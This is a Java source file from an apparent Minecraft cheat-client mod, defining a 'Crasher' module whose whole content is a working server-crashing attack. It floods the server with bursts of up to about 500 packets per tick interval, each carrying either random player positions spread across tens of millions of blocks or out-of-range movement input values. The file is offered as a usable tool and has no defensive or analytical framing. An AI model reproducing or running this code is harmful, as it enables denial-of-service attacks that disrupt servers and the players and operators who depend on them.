package tudbut.mod.client.ttcp.mods.misc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketInput;
import net.minecraft.network.play.client.CPacketPlayer;
import tudbut.mod.client.ttcp.TTCp;
import tudbut.mod.client.ttcp.utils.Module;
import tudbut.mod.client.ttcp.utils.Setting;
import tudbut.mod.client.ttcp.utils.category.Misc;
import tudbut.obj.Save;

@Misc
public class Crasher
extends Module {
    boolean run = false;
    @Save
    int timer = 5;
    @Save
    int instances = 5;
    @Save
    int type = 0;
    int i = 0;

    @Override
    public void updateBinds() {
        this.subComponents.clear();
        this.subComponents.add(Setting.createBoolean("Run", this, "run"));
        this.subComponents.add(Setting.createInt(0, 60, "DelayTicks", this, "timer"));
        this.subComponents.add(Setting.createInt(0, 500, "Instances", this, "instances"));
        this.subComponents.add(Setting.createInt(0, 1, "Type", this, "type"));
    }

    @Override
    public void onSubTick() {
        ++this.i;
        if (this.i >= this.timer + 1) {
            this.i = 0;
            if (this.run) {
                for (int j = 0; j < this.instances + 1; ++j) {
                    TTCp.player.connection.sendPacket(this.packet());
                }
            }
        }
    }

    public Packet<?> packet() {
        if (this.type == 0) {
            return new CPacketPlayer.PositionRotation(Math.random() * 6.0E7 - 3.0E7, Math.random() * 256.0, Math.random() * 6.0E7 - 3.0E7, (float)(Math.random() * 360.0) - 180.0f, (float)(Math.random() * 360.0) - 180.0f, true);
        }
        if (this.type == 1) {
            return new CPacketInput((float)(Math.random() * 1000.0) - 500.0f, (float)(Math.random() * 1000.0) - 500.0f, false, false);
        }
        return null;
    }
}
